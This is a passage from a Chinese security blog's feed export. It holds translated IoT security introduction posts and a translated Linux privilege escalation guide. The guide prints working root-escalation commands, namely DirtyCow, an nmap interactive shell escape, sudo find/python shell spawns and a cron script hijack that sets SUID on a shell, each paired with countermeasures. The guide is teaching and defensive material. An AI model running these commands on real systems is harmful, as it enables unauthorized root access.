</ol>
</li>
<li><ol start="7">
<li>IoT Protocols – <a href="https://www.postscapes.com/internet-of-things-protocols/" target="_blank" rel="external">https://www.postscapes.com/internet-of-things-protocols/</a></li>
</ol>
</li>
<li><ol start="8">
<li>I2C Serial EEPROM image source – <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg/180px-AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg" target="_blank" rel="external">https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg/180px-AT24C02_EEPROM_1480355_6_7_HDR_Enhancer.jpg</a></li>
</ol>
</li>
<li><ol start="9">
<li>JTAG port image source – <a href="https://i.stack.imgur.com/IiUqm.jpg" target="_blank" rel="external">https://i.stack.imgur.com/IiUqm.jpg</a></li>
</ol>
</li>
</ul>
<p><em>原文链接：<a href="https://payatu.com/iot-security-part-2-101-iot-attack-surface" target="_blank" rel="external">https://payatu.com/iot-security-part-2-101-iot-attack-surface</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="物联网攻击面">物联网攻击面</h2><p>欢迎！我希望您已经阅读了之前的博客文章<a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分</a>，如果没有，希望你阅读它以了解物联网和物联网架构的含义。现在我们将开始进入安全领域，并尝试定义一种方法来理解和创建结构化流程来执行物联网的安全研究或渗透测试。<br>如果我们查看上一篇文章中定义的架构，现在我们可以轻松的对物联网进行拆分并尝试为每个组件单独定义攻击面，然后将它们组合起来以创建整个物联网生态系统攻击面。我称其为 IoT 生态系统而不是 IoT 产品，因为它确实是一个由不同组件相互通信并解决特定现实世界问题的生态系统。下面将继续定义物联网生态系统的攻击面，并详细讨论每个组件的攻击面。按组件的攻击面可以将物联网组件攻击面分为三个或四个（如果我们将通信作为攻击面），主要攻击面如下：</p>
<ul>
<li><ol>
<li>移动应用</li>
</ol>
</li>
<li><ol start="2">
<li>云</li>
</ol>
</li>
<li><ol start="3">
<li>通信</li>
</ol>
</li>
<li><ol start="4">
<li>物联网终端设备<div align="center"><br><img src="/img/20210921device_attack_surface-768x456.png" align=""/><br></div>

</li>
</ol>
</li>
</ul>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-1.物联网介绍及其架构（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/"/>
    <id>http://www.youngroe.com/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/</id>
    <published>2021-09-21T11:39:22.000Z</published>
    <updated>2021-11-06T02:01:10.204Z</updated>
    <content type="html"><![CDATA[<p>最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。<br>对于安全研究人员而言，每项新技术和复杂技术的问题都可能是不知道从哪里开始以及如何、从哪里进行攻击。这是一个非常常见的问题，并且有一个通用的解决方案，即对技术进行分解为多个部分并单独学习每个部分。这个过程可以让你掌握了每个部分的知识，并引导你专注于其中的最有趣的部分。如果你都读到这里，我会假设你会坚持继续学习。所以，不要拖延，让我们开始吧:)。</p>
<p><strong>注意：</strong></p>
<ul>
<li><ol>
<li>本系列中文章中的知识的是通用的，可以应用于任何领域的物联网产品的安全研究，无论其用途如何，包括家庭自动化、工业控制系统、医疗保健、交通等。</li>
</ol>
</li>
<li><ol start="2">
<li>我将使用这些词除非在解释中特别提及，否则设备、硬件和传感器可互换地表示相同的事物。</li>
</ol>
</li>
<li><ol start="3">
<li>我提到物联网生态系统是指物联网产品或解决方案，因为物联网技术的性质包含很多不同的技术。</li>
</ol>
</li>
</ul>
<a id="more"></a>
<h2 id="物联网_!=_硬件">物联网 != 硬件</h2><p>这是人们普遍存在的一种误解，即物联网仅意味着硬件，这会造成一个的障碍，并阻止大多数安全研究人员进入物联网安全领域。是的，即使涉及硬件，也可以学习分析它所需的技能。学习硬件知识可以降低学习物联网安全技术的难度，并且学习硬件相关的技术需要一定的恒心和毅力。当您阅读完本文时，您会意识到硬件仅占 IoT 生态系统的 1/3 部分。更重要的是如果您可以攻击其他组件（例如云），可能会造成比入侵设备更多的损害。几年前，当我开始研究物联网安全时，我也有同样的顾虑，所以我把问题分解，各个击破，在此过程中学到了一些很酷的技巧。相信我，我这样的普通人都可以做到。</p>
<h2 id="介绍">介绍</h2><h3 id="什么是物联网？">什么是物联网？</h3><p>网上有很多关于物联网的定义，掌握一项技术的关键是了解它背后的基本意识形态，这有助于你了解它并根据之前的经验学习它。每个人都可以有自己的定义，对我来说，物联网是关于三件重要的事情<br><strong>1. 自动化：</strong> 坦率地说人都是懒惰的，未来就是让我们变得更懒惰并自动化我们目前手动完成的任何事情。<br><strong>2. 虚拟世界与物理世界之间的接口</strong>：在物理世界和虚拟世界之间架起一座桥梁。简单来说，允许虚拟世界从/向物理世界读取和写入。当我说读取时，我的意思是感知物理环境并将状态转换为数据并将其发送到虚拟数据存储以进行进一步分析，例如温度传感器、医疗传感器、相机等。 写入是指通过动作来控制物理世界的方法，即将数据转换为物理世界上的动作，例如门锁、控制车辆操作、喷水、医疗泵等。<br><strong>3. 信息收集和决策制定：</strong> 可以实时分析从设备收集的数据，以更好地了解环境、对某些事件采取行动、找出任何物理世界问题的根本原因等。</p>
<p>因此，物联网技术为用户和厂商提供了实时信息和任务的自动化。<br>基于上述定义，如果我们要创造一种技术来解决这个问题，我们需要</p>
<ul>
<li><ol>
<li>提供虚拟与现实之间接口的硬件设备</li>
</ol>
</li>
<li><ol start="2">
<li>用于存储数据的后端存储和对数据进行统计分析的计算能力.</li>
</ol>
</li>
<li><ol start="3">
<li>用户查看分析数据以及向物理世界发送命令的虚拟界面。</li>
</ol>
</li>
</ul>
<p>第一个是通过嵌入相应传感器、控制器的经济硬件设备来解决，第二个是通过云方便地解决，最后第三个是通过移动应用程序和/或网络应用程序轻松解决。</p>
<h3 id="哪里使用了物联网？">哪里使用了物联网？</h3><p>正如我上面提到的，物联网就是让我们变胖和变懒。人类善于创新，无论出于何种原因，我们都可以在近乎完美的系统中找出可以改进的地方。在当今世界，物联网技术的使用是无限的。我敢打赌，只要你往周围看一下，你就可能会有一个物联网应用的想法。目前物联网在各个领域都出现了大量创新，主要目标都是是物理世界的自动化和实时数据分析，包含以下领域：</p>
<ul>
<li><ol>
<li>家庭自动化</li>
</ol>
</li>
<li><ol start="2">
<li>智能基础设施</li>
</ol>
</li>
<li><ol start="3">
<li>医疗保健</li>
</ol>
</li>
<li><ol start="4">
<li>工业控制系统</li>
</ol>
</li>
<li><ol start="5">
<li>交通运输</li>
</ol>
</li>
<li><ol start="6">
<li>实用工具</li>
</ol>
</li>
<li><ol start="7">
<li>以及更多</li>
</ol>
</li>
</ul>
<h2 id="物联网架构">物联网架构</h2><h3 id="高级视图">高级视图</h3><p>最简单的物联网架构包括三个组件，如下图所示。</p>
<ol>
<li>移动应用</li>
<li>云</li>
<li>物联网终端</li>
</ol>
<div align="center"><br><img src="/img/20210921iot_components-768x454.png" align><br></div>

<p>组件之间使用哪种通信方式取决于物联网产品的用途和类型。以下是一些例子，说明哪些组件之间会通信以及如何通信。</p>
<ul>
<li><ol>
<li>物联网终端仅与移动应用 – 例如基于蓝牙 BLE 的设备</li>
</ol>
</li>
<li><ol start="2">
<li>物联网终端仅与物联网网关对话 - 例如ZigBee、无线 HART 设备等。</li>
</ol>
</li>
<li><ol start="3">
<li>移动设备仅与云通话——在用户无法近距离访问设备且只能通过云进行控制的情况下。</li>
</ol>
</li>
</ul>
<h3 id="功能架构">功能架构</h3><p>对物联网从功能架构上可以进一步定义为一个通过移动网络或者互联网进行连接的传感器网络。传感器可能拥有自己的基于传统 TCP/IP 的技术或基于无线电的网络，以防传统电信网络或者无线电通信无法实现的情况。在后一种情况下，需要有一个网关（我们所谓的物联网网关/集线器/路由器）作为无线电通信和传统 TCP/IP 通信之间的接口。从现在开始，我将把 TCP/IP 称为传统的网络通信。</p>
<div align="center"><br><img src="/img/20210921cloud_iot_1-768x415.png" align><br></div>

<p>我们还可以在不同地方多个传感器网络，这些网络可以通过物联网网关通过传统网络相互通信和连接，如下所示。</p>
<div align="center"><br><img src="/img/20210921cloud_iot_2-768x335.png" align><br></div>

<h3 id="分层模型">分层模型</h3><p>如果我们从分层的角度来看物联网技术，我们可以将物联网技术核心划分为3层。</p>
<ol>
<li>传感层——由硬件传感器和传感器网络组成。</li>
<li>通信层——这包括允许传感层与管理层进行通信的通信网络，例如——Wifi、3G、LTE、以太网等。</li>
<li>管理层——这是最顶层，负责理解原始数据并为用户提供可视化视图。它包括云、存储、应用程序等。<div align="center"><br><img src="/img/20210921iot_layered-768x519.png" align><br></div>

</li>
</ol>
<p>如果您正在阅读本文，那么您对物联网安全非常感兴趣:)。这篇博文的目的是让您了解物联网技术。后续，我们将开始谈论物联网安全。下一篇博文将讲述物联网生态系统的攻击面。我希望你喜欢阅读这篇文章，就像我喜欢写它一样:)。</p>
<p><em>原文链接：<a href="https://payatu.com/iot-security-part-1-101-iot-introduction-architecture" target="_blank" rel="external">https://payatu.com/iot-security-part-1-101-iot-introduction-architecture</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。<br>对于安全研究人员而言，每项新技术和复杂技术的问题都可能是不知道从哪里开始以及如何、从哪里进行攻击。这是一个非常常见的问题，并且有一个通用的解决方案，即对技术进行分解为多个部分并单独学习每个部分。这个过程可以让你掌握了每个部分的知识，并引导你专注于其中的最有趣的部分。如果你都读到这里，我会假设你会坚持继续学习。所以，不要拖延，让我们开始吧:)。</p>
<p><strong>注意：</strong></p>
<ul>
<li><ol>
<li>本系列中文章中的知识的是通用的，可以应用于任何领域的物联网产品的安全研究，无论其用途如何，包括家庭自动化、工业控制系统、医疗保健、交通等。</li>
</ol>
</li>
<li><ol start="2">
<li>我将使用这些词除非在解释中特别提及，否则设备、硬件和传感器可互换地表示相同的事物。</li>
</ol>
</li>
<li><ol start="3">
<li>我提到物联网生态系统是指物联网产品或解决方案，因为物联网技术的性质包含很多不同的技术。</li>
</ol>
</li>
</ul>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux权限提升指南（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/08/20/Cybersecurity/guide-linux-privilege-escalation/"/>
    <id>http://www.youngroe.com/2021/08/20/Cybersecurity/guide-linux-privilege-escalation/</id>
    <published>2021-08-20T11:39:22.000Z</published>
    <updated>2021-11-05T14:22:46.798Z</updated>
    <content type="html"><![CDATA[<h2 id="0x0_介绍">0x0 介绍</h2><p>应用或者进程获取的权限应该按照最小权限原则赋予，只授予执行各自功能最小权限。授予不需要的权限可能回导致权限滥用，同时权限提升也是检测恶意代码的一个重要指标。</p>
<h2 id="0x01_什么是权限提升？">0x01 什么是权限提升？</h2><p>大多数计算机系统被设计为供多个用户使用。权限是指允许用户做什么。常见权限包括查看和编辑文件、修改系统文件等。权限提升是指用户获得他们无权获得的权限。这些权限可用于删除文件、查看隐私信息或安装恶意程序（如病毒）。它通常发生在系统存在允许绕过系统安全机制漏洞时，或者系统设计假设存在缺陷时。<br>权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得应用程序或用户保护的资源的更高访问权限的行为。结果是应用程序拥有比执行未经授权操作的开发人员或系统管理员预期更多的权限。<br>虽然根据统计大部分公司使用的更多的是 Windows 客户端程序，但在考虑到公司的网络安全时，Linux 特权升级攻击则是需要应对的更大的威胁。公司的关键基础设施，例如 Web 服务器、数据库、防火墙等，很可能运行在 Linux 操作系统。对这些关键基础设施的损害有可能严重破坏组织的运营。此外，物联网 (IoT) 和嵌入式系统在工作场所变得无处不在，从而增加了恶意黑客的潜在目标数量。鉴于 Linux 设备在工作场所的流行，公司应该加强和保护这些设备。</p>
<a id="more"></a>
<h2 id="0x02_目的">0x02 目的</h2><p>在本文中，我们将详细讨论任何可能对基于 Linux 的系统成功进行权限提升攻击的安全问题。我们还将讨论攻击者如何使用已知技术提升在远程主机上的权限，以及如何保护我们的系统免受任何此类攻击。最后，我们将举例说明如何在不同的 Linux 系统上在不同的条件下实现权限提升。<br>本文旨在通过示例帮助初学者了解 Linux 权限提升的基础知识。它不是列举 Linux 提权方法的备忘单。权限提升与使用正确的方法有关。有多种方法可以执行示例中相同任务。如果你想要一个对 Linux 进行提权的备忘单，那么你一定要看看 g0tmi1k 的文章 – <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
<h2 id="0x03_Linux权限模型">0x03 Linux权限模型</h2><div align="center"><br><img src="/img/20210820Linux_privage.png" align><br></div><br>Linux 从 UNIX 继承了文件所有权和权限的概念。文件权限是系统保护自己免受恶意篡改的一种方式。在 UNIX 网络服务器上，存储在硬盘驱动器上的每个文件和文件夹都有一组与之相关的权限，这说明了谁可以对文件执行什么操作。<br><br><div align="center"><br><img src="/img/20210820Linux_whoami.png" align><br></div>

<p>在上面的两个截图中，我们可以看到文件“docker-compose.yml”只有所有者“root”具有读取权限。如果任何其他用户尝试读取此文件，他将无法读取它。当我不是超级用户时尝试读取文件时，我们可以看到权限被拒绝。</p>
<p>我们不会在这里详细介绍权限模型，因为这是另一个大话题。这只是为了理解用户无法访问（read/write/execute）他不被允许访问的文件的事实。但是，超级用户（root）可以访问系统上存在的所有文件。为了修改任何重要的配置或执行任何进一步的攻击，首先我们需要在任何基于 Linux 的系统上获得 root 访问权限。</p>
<h2 id="0x04_为什么需要提权">0x04 为什么需要提权</h2><ul>
<li>读/写任何敏感文件</li>
<li>即使重启也能持久化</li>
<li>植入永久后门</li>
</ul>
<h2 id="0x05_提权主要使用的技术">0x05 提权主要使用的技术</h2><p>我们假设现在我们在远程系统上有 shell。但我们可能没有“root”权限。下面提到的技术可用于在系统上获得“root”权限。</p>
<h3 id="1-内核漏洞利用代码">1.内核漏洞利用代码</h3><p>内核漏洞利用代码是利用内核漏洞以提升权限执行任意代码的程序。成功的内核漏洞利用通常会以 root 命令提示符的形式为攻击者提供对目标系统的超级用户访问权限。在许多情况下，在 Linux 系统上提升到 root 权限就像将内核漏洞下载到目标文件系统、编译漏洞然后执行它一样简单。<br>假设我们可以以非特权用户身份运行代码，这就是内核漏洞利用的通用工作流程。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 欺骗内核在内核模式下运行我们的payload</span><br><span class="line"><span class="number">2.</span> 操作内核数据，例如进程权限</span><br><span class="line"><span class="number">3.</span> 以新权限启动shell 获取root！</span><br></pre></td></tr></table></figure>
<p>内核漏洞攻击要成功，攻击者需要四个条件：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 有漏洞的内核</span><br><span class="line"><span class="number">2.</span> 与漏洞相匹配的漏洞利用程序</span><br><span class="line"><span class="number">3.</span> 将漏洞利用程序上传到目标的能力</span><br><span class="line"><span class="number">4.</span> 在目标上执行漏洞利用的能力</span><br></pre></td></tr></table></figure>
<p>防御内核漏洞的最简单方法是对内核进行打补丁和更新。在没有补丁的情况下，管理员需要截断向目标上传和执行漏洞利用程序的过程。考虑到这些因素，如果管理员可以阻止将漏洞利用引入或执行到 Linux 文件系统，则内核漏洞利用攻击不再可行。因此，管理员应重点限制或删除启用文件传输的程序，例如 FTP、TFTP、SCP、wget 和 curl。当需要这些程序时，它们的使用应限于特定用户、目录、应用程序（例如 SCP）和特定 IP 地址或域。</p>
<p><strong>臭名昭著的 DirtyCow 漏洞——Linux 内核 &lt;= 3.19.0-73.8</strong></p>
<p>在 Linux 内核的内存子系统处理私有只读内存映射的写时复制 (COW) 的方式中存在竞争条件漏洞。无特权的本地用户可以利用此漏洞获得对其他只读内存映射的写访问权限，从而增加他们在系统上的特权。这是有史以来发现的最严重的提权漏洞之一，几乎影响了所有主要的 Linux 发行版。<br>通过dirtycow漏洞实现利用</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>whoami – 告诉我们当前用户是 john（非 root 用户）</span><br><span class="line"><span class="variable">$ </span>uname -a – 让我们知道容易受到dirtycow 攻击的内核版本</span><br><span class="line">&gt; 从这里下载了dirtycow漏洞——<span class="symbol">https:</span>/<span class="regexp">/www.exploit-db.com/exploits</span><span class="regexp">/40839/</span></span><br><span class="line">&gt; 编译并执行它。它通过编辑 /etc/passwd 文件将“root”用户替换为新用户“rash”。</span><br><span class="line"><span class="variable">$ </span>su rash - 它将当前登录的用户更改为 root 的“rash”。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820dirtycow.png" align><br></div>

<p>您可以在这里查看dirtycow漏洞利用的其他版本 – <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="external">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a><br>有许多不同的本地提权漏洞可用于不同的内核和操作系统。是否可以使用内核漏洞在 Linux 主机上获得 root 访问权限取决于内核是否有漏洞。 Kali Linux 有一个exploit-db 漏洞的本地副本，可以更容易地搜索本地root 漏洞。虽然我不建议在搜索 Linux 内核漏洞时完全依赖这个数据库。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit Linux Kernel <span class="number">2.6</span><span class="number">.24</span> – 它向我们展示了 kali Linux 中已经存在的特定 Linux 内核的所有可用漏洞。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820searchsploit.png" align><br></div>

<p>为什么应该首先避免运行任何本地提权漏洞利用程序呢？<br>虽然，运行漏洞利用程序并获得 root 访问权限感觉很诱人，但您应该始终将此作为最后的选择。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 远程主机可能会崩溃，因为许多公开可用的 root 漏洞都不是很稳定。</span><br><span class="line"><span class="number">2.</span> 您可能获得了 root 权限，然后系统崩溃了。</span><br><span class="line"><span class="number">3.</span> 漏洞利用可能会留下可以让您被抓住的痕迹/日志。</span><br></pre></td></tr></table></figure>
<p>在运行内核提权漏洞之前，您应该始终尝试使用下面讨论的其他技术来获取 root。</p>
<p><strong>对策：</strong><br>经常对内核打补丁和更新。</p>
<h3 id="2-利用以_root_身份运行的服务">2.利用以 root 身份运行的服务</h3><p>利用以 root 身份运行的任何服务都会为您提供 Root 权限！</p>
<p>著名的 <a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="external">EternalBlue</a> 和 <a href="https://thehackernews.com/2017/05/samba-rce-exploit.html" target="_blank" rel="external">SambaCry</a> 漏洞利用，利用了通常以 root 身份运行的 smb 服务。<br>只需一个漏洞，攻击者就可以获得远程代码执行和本地权限提升。<br>由于它的致命组合，它被大量用于在全球范围内传播勒索软件。<br>您应该经常检查 Web 服务器、邮件服务器、数据库服务器等是否以 root 身份运行。很多时候，Web 管理员以 root 身份运行这些服务而忘记了它可能导致的安全问题。可能存在在本地运行且未公开的服务也可以被利用。</p>
<p><code>$ netstat -antup – 它会显示所有打开并正在侦听的端口。我们可以检查本地运行的服务是否可以被利用。</code></p>
<p><strong>利用以 root 身份运行的易受攻击的 MySQL 版本来获取 root 访问权限</strong></p>
<p><a href="https://www.exploit-db.com/exploits/1518/" target="_blank" rel="external">MySQL UDF 动态库漏洞利用</a>允许您从 mysql shell 执行任意命令。如果 mysql 以 root 权限运行，则命令将以 root 身份执行。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">ps</span> -aux | <span class="keyword">grep</span> root - 它向我们展示了以 root 身份运行的服务。</span><br><span class="line">&gt; 我们可以使用 MySQL <span class="keyword">shell</span> 执行任意命令，这些命令将以 root 身份执行。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820mysql_root.png" align><br></div>

<div align="center"><br><img src="/img/20210820mysql_udf_root.png" align><br></div>

<p>Web 管理员犯的最大错误之一就是以 root 权限运行 Web 服务器。 Web 应用程序上的命令注入漏洞可将攻击者引导至 root shell。这是一个典型的例子，说明为什么除非真的需要，否则不应以 root 身份运行任何服务。</p>
<p>对拥有 root 权限的程序进行二进制漏洞利用远没有内核漏洞利用那么危险，因为即使服务崩溃，主机也不会崩溃，服务可能会自动重启。</p>
<p><strong>对策：</strong><br>除非确实需要，否则切勿以 root 身份运行任何服务，尤其是 Web、数据库和文件服务器。</p>
<h3 id="3-利用_SUID_可执行文件">3.利用 SUID 可执行文件</h3><p>SUID 代表 set user ID，是 Linux 的一项功能，允许用户以指定用户的权限执行文件。例如，Linux ping 命令通常需要 root 权限才能打开原始网络套接字。通过将 ping 程序标记为 SUID，所有者为 root，只要低权限用户执行程序，ping 就会以 root 权限执行。</p>
<p><code>&gt; -rwsr-xr-x——“s”字符而不是“x”表示设置了 SUID 位。</code></p>
<div align="center"><br><img src="/img/20210820ping_suid_bit.png" align><br></div>

<p>SUID 是一项功能，如果使用得当，实际上可以增强 Linux 的安全性。问题是管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的 SUID 配置。<br>很多系统管理员不明白在哪里设置 SUID 位，在哪里不设置。不应在任何文件编辑器上特别设置 SUID 位，因为攻击者可以覆盖系统上存在的任何文件。</p>
<p><strong>利用易受攻击的 SUID 可执行文件获取 root 访问权限</strong></p>
<p><code>$ find / -perm -u=s -type f 2&gt;/dev/null – 打印设置了 SUID 位的可执行文件</code></p>
<div align="center"><br><img src="/img/20210820suid_bit_set_nmap.png" align><br></div>

<p><code>$ ls -la /usr/local/bin/nmap – 让我们确认 nmap 是否设置了 SUID 位。</code></p>
<div align="center"><br><img src="/img/20210820suid_nmap.png" align><br></div>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; Nmap 设置了 SUID 位。很多时候管理员为<span class="keyword">nmap</span>设置了SUID，以便它可以用于有效地扫描网络，因为如果您不以 root 权限运行它，所有 <span class="keyword">nmap</span> 扫描技术都不起作用。</span><br><span class="line">&gt; 但是，<span class="keyword">nmap</span> 旧版本中有一项功能，您可以在其中以交互模式运行 <span class="keyword">nmap</span>，从而可以转义到 <span class="keyword">shell</span>。如果 <span class="keyword">nmap</span> 设置了 SUID 位，它将以 root 权限运行，我们可以通过它的交互模式访问“root”<span class="keyword">shell</span>。</span><br><span class="line">$ <span class="keyword">nmap</span> –interactive – 运行 <span class="keyword">nmap</span> 交互模式</span><br><span class="line">$ !sh – 让你从 <span class="keyword">nmap</span> <span class="keyword">shell</span> 切换到系统 <span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820nmap_root.png" align><br></div>

<p><strong>对策：</strong></p>
<ul>
<li>不应将 SUID 位设置为任何能够变换为 shell 的程序。</li>
<li>永远不要在任何文件编辑器/编译器/解释器上设置 SUID 位，因为攻击者可以轻松读取/覆盖系统上存在的任何文件。</li>
</ul>
<h3 id="4-利用_SUDO_权限/用户">4.利用 SUDO 权限/用户</h3><p>如果攻击者无法通过任何其他技术直接获得 root 访问权限，他可能会尝试危害任何具有 SUDO 访问权限的用户。一旦他可以访问任何 SUDO 用户，他基本上可以使用 root 权限执行任何命令。<br>一个典型的例子是为 find 命令分配 SUDO 权限，以便其他用户可以搜索系统中的特定文件/日志。虽然管理员可能不知道“find”命令包含用于命令执行的参数，但攻击者可以使用 root 权限执行命令。</p>
<p><strong>利用错误配置的 SUDO 权限获取 root 访问权限</strong></p>
<p><code>$ sudo -l – 打印允许我们作为 SUDO 运行的命令</code></p>
<div align="center"><br><img src="/img/20210820sudo-l.png" align><br></div>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们可以使用 SUDO 运行 <span class="keyword">find</span>、<span class="keyword">cat</span> 和 <span class="keyword">python</span>。当使用 SUDO 运行时，所有这些命令都将以 root 身份运行。</span><br><span class="line">如果我们可以通过这些命令中的任何一个以某种方式运行 <span class="keyword">shell</span>，我们就可以获得 root 访问权限。</span><br><span class="line">$ sudo <span class="keyword">find</span> /home -exec <span class="keyword">sh</span> -<span class="keyword">i</span> \; – <span class="keyword">find</span> 命令的 exec 参数可用于任意代码执行。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820find_command_root.png" align><br></div>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 永远不要给任何编程语言编译器、解释器和编辑器的 SUDO 权限。</span><br><span class="line">&gt; 这项准则也适用于 <span class="keyword">vi</span>、more、less、<span class="keyword">perl</span>、<span class="keyword">ruby</span>、gdb 等。</span><br><span class="line">$ sudo <span class="keyword">python</span> -<span class="keyword">c</span> <span class="string">'import pty;pty.spawn("/bin/bash");'</span> —— 启动一个<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p><strong>对策：</strong></p>
<ul>
<li>不要向任何可以切换为 shell 的程序授予 sudo 权限。</li>
<li>永远不要给 vi、more、less、nmap、perl、ruby、python、gdb 等类型程序 SUDO 权限。</li>
</ul>
<h2 id="5-_利用配置不当的_cron_任务">5. 利用配置不当的 cron 任务</h2><p>Cron 任务，如果配置不当，可以被利用来获得 root 权限。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> cron 任务中是否有任何可写的脚本或二进制文件？ </span><br><span class="line"><span class="number">2.</span> 我们能不能改写cron文件本身。 </span><br><span class="line"><span class="number">3.</span> cron.d 目录是否可写？</span><br></pre></td></tr></table></figure>
<p>Cron 任务通常以 root 权限运行。如果我们可以成功修改在 cron 任务中定义的任何脚本或二进制文件，那么我们就可以使用 root 权限执行任意代码。</p>
<p><code>$ ls -la /etc/cron.d – 打印已经存在于 cron.d 中的 cron 任务</code></p>
<div align="center"><br><img src="/img/20210820cron-1.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -2 -<span class="keyword">type</span> f 2&gt;/dev/null – 打印可写文件</span><br><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">la</span> /usr/<span class="keyword">local</span>/sbin/cron-logrotate.<span class="keyword">sh</span> – 让我们确认 cron-logrotate.<span class="keyword">sh</span> 是否可写入。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820logrotate_Cron_job_worl_writable.png" align><br></div>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cron-lograte<span class="class">.sh</span> 是全局可写的，它由 logrotate cronjob 运行。我们在 cron-lograte<span class="class">.sh</span> 中写入/附加的任何命令都将以“root”身份执行。</span><br><span class="line">&gt; 我们在 /tmp 目录下写一个 C 文件并编译它。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820rootme.c_cronjob.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rootme 可执行文件将生成一个 <span class="keyword">shell</span>。</span><br><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">la</span> rootme - 它告诉我们它归用户“SHayslett”所有</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820cron_job_.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">"chown root:root /tmp/rootme; chmod u+s /tmp/rootme;"</span>&gt;/usr/<span class="keyword">local</span>/sbin/cron-logrotate.<span class="keyword">sh</span> </span><br><span class="line">– 这将更改可执行文件的所有者和组为 root。它还将设置 SUID 位。</span><br><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">la</span> rootme – 5 分钟后，logrotate cronjob 运行，cron-logrotate.<span class="keyword">sh</span> 以 root 权限执行。</span><br><span class="line">$ ./rootme – 产生一个 root <span class="keyword">shell</span>。</span><br></pre></td></tr></table></figure>
